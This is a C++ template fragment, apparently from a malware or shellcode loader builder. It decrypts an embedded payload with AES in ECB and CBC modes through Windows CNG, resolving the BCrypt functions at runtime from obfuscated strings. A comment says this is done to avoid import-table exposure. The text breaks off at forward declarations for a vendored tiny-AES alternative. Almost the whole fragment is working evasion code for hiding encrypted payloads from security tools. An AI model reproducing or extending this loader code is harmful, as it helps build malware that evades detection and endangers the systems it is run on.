#include "obfuscate.hpp.in"

{{#IF CRYPTO_CNG}}
// Windows CNG (BCrypt) decryption - dynamically resolved to avoid import table exposure
#include <bcrypt.h>

using BCryptOpenAlgorithmProvider_t = NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
using BCryptSetProperty_t = NTSTATUS(WINAPI*)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
using BCryptGenerateSymmetricKey_t = NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
using BCryptDecrypt_t = NTSTATUS(WINAPI*)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
using BCryptDestroyKey_t = NTSTATUS(WINAPI*)(BCRYPT_KEY_HANDLE);
using BCryptCloseAlgorithmProvider_t = NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE, ULONG);

struct CngFunctions {
    BCryptOpenAlgorithmProvider_t pOpen;
    BCryptSetProperty_t pSetProp;
    BCryptGenerateSymmetricKey_t pGenKey;
    BCryptDecrypt_t pDecrypt;
    BCryptDestroyKey_t pDestroyKey;
    BCryptCloseAlgorithmProvider_t pClose;
    bool valid;
};

static CngFunctions resolve_cng() {
    CngFunctions f = {};
    HMODULE hBcrypt = LoadLibraryW(obf_wide(L"bcrypt.dll"));
    if (!hBcrypt) return f;
    f.pOpen     = reinterpret_cast<BCryptOpenAlgorithmProvider_t>(GetProcAddress(hBcrypt, obf("BCryptOpenAlgorithmProvider")));
    f.pSetProp  = reinterpret_cast<BCryptSetProperty_t>(GetProcAddress(hBcrypt, obf("BCryptSetProperty")));
    f.pGenKey   = reinterpret_cast<BCryptGenerateSymmetricKey_t>(GetProcAddress(hBcrypt, obf("BCryptGenerateSymmetricKey")));
    f.pDecrypt  = reinterpret_cast<BCryptDecrypt_t>(GetProcAddress(hBcrypt, obf("BCryptDecrypt")));
    f.pDestroyKey = reinterpret_cast<BCryptDestroyKey_t>(GetProcAddress(hBcrypt, obf("BCryptDestroyKey")));
    f.pClose    = reinterpret_cast<BCryptCloseAlgorithmProvider_t>(GetProcAddress(hBcrypt, obf("BCryptCloseAlgorithmProvider")));
    f.valid = f.pOpen && f.pSetProp && f.pGenKey && f.pDecrypt && f.pDestroyKey && f.pClose;
    return f;
}

static bool decrypt_aes_ecb_cng(uint8_t* data, size_t data_len,
                                 const uint8_t* key, size_t key_len,
                                 uint8_t* out, size_t* out_len) {
    auto cng = resolve_cng();
    if (!cng.valid) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (!BCRYPT_SUCCESS(cng.pOpen(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
    if (!BCRYPT_SUCCESS(cng.pSetProp(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0))) {
        cng.pClose(hAlg, 0); return false;
    }
    if (!BCRYPT_SUCCESS(cng.pGenKey(hAlg, &hKey, NULL, 0,
        (PUCHAR)key, (ULONG)key_len, 0))) { cng.pClose(hAlg, 0); return false; }

    ULONG result_len = 0;
    NTSTATUS status = cng.pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
        NULL, NULL, 0, out, (ULONG)*out_len, &result_len, 0);

    *out_len = result_len;
    cng.pDestroyKey(hKey);
    cng.pClose(hAlg, 0);
    return BCRYPT_SUCCESS(status);
}

static bool decrypt_aes_cbc_cng(uint8_t* data, size_t data_len,
                                 const uint8_t* key, size_t key_len,
                                 const uint8_t* iv,
                                 uint8_t* out, size_t* out_len) {
    auto cng = resolve_cng();
    if (!cng.valid) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (!BCRYPT_SUCCESS(cng.pOpen(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
    if (!BCRYPT_SUCCESS(cng.pSetProp(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        cng.pClose(hAlg, 0); return false;
    }
    if (!BCRYPT_SUCCESS(cng.pGenKey(hAlg, &hKey, NULL, 0,
        (PUCHAR)key, (ULONG)key_len, 0))) { cng.pClose(hAlg, 0); return false; }

    uint8_t iv_copy[16];
    memcpy(iv_copy, iv, 16);

    ULONG result_len = 0;
    NTSTATUS status = cng.pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
        NULL, iv_copy, 16, out, (ULONG)*out_len, &result_len, 0);

    *out_len = result_len;
    cng.pDestroyKey(hKey);
    cng.pClose(hAlg, 0);
    return BCRYPT_SUCCESS(status);
}
{{#ENDIF}}

{{#IF CRYPTO_TINYAES}}
// Vendored tiny-AES-c decryption (no Windows API dependency)
// Included inline in the loader

#define AES_BLOCKLEN 16
#define AES_KEYLEN 32
#define AES_keyExpSize 240

struct AES_ctx_loader {
    uint8_t RoundKey[AES_keyExpSize];
    uint8_t Iv[AES_BLOCKLEN];
};

// Forward declarations - full AES implementation included below
static void AES_init_ctx_loader(AES_ctx_loader* ctx, const uint8_t* key);
static void AES_init_ctx_iv_loader(AES_ctx_loader* ctx, const uint8_t* key, const uint8_t* iv);
static void AES_ECB_decrypt_loader(const AES_ctx_loader* ctx, uint8_t* buf);
static void AES_CBC_decrypt_buffer_loader(AES_ctx_loader* ctx, uint8_t* buf, size_t length);

